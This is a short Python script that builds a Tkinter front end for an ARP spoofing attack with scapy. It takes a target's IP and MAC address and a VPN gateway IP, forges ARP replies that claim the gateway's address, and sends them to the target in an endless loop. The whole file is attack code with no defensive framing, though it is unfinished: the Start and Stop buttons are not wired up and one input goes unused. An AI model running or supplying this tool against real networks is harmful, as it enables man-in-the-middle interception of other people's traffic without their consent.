import tkinter as tk
from scapy.all import *
import time
import threading

# create the main window
root = tk.Tk()
root.title("ARP Spoofing")

# create the input fields
target_ip_label = tk.Label(root, text="Target IP")
target_ip_label.grid(row=0, column=0)
target_ip_entry = tk.Entry(root)
target_ip_entry.grid(row=0, column=1)

target_mac_label = tk.Label(root, text="Target MAC")
target_mac_label.grid(row=1, column=0)
target_mac_entry = tk.Entry(root)
target_mac_entry.grid(row=1, column=1)

spoof_ip_label = tk.Label(root, text="Spoof IP")
spoof_ip_label.grid(row=2, column=0)
spoof_ip_entry = tk.Entry(root)
spoof_ip_entry.grid(row=2, column=1)

vpn_gateway_ip_label = tk.Label(root, text="VPN Gateway IP")
vpn_gateway_ip_label.grid(row=3, column=0)
vpn_gateway_ip_entry = tk.Entry(root)
vpn_gateway_ip_entry.grid(row=3, column=1)

# create the start and stop buttons
start_button = tk.Button(root, text="Start")
start_button.grid(row=4, column=0)
stop_button = tk.Button(root, text="Stop")
stop_button.grid(row=4, column=1)

# create the output field
output_label = tk.Label(root, text="Output")
output_label.grid(row=5, column=0)
output_text = tk.Text(root)
output_text.grid(row=5, column=1)

def arp_spoof():
    # get the input values
    target_ip = target_ip_entry.get()
    target_mac = target_mac_entry.get()
    spoof_ip = spoof_ip_entry.get()
    vpn_gateway_ip = vpn_gateway_ip_entry.get()

    # create an ARP packet
    arp_packet = ARP(op=2, pdst=target_ip, hwdst=target_mac, psrc=vpn_gateway_ip)

    # create a thread to send the packet repeatedly
    def send_packet():
        while True:
            send(arp_packet)
            time.sleep(1)

    thread = threading.Thread(target=send_packet)
    thread.start()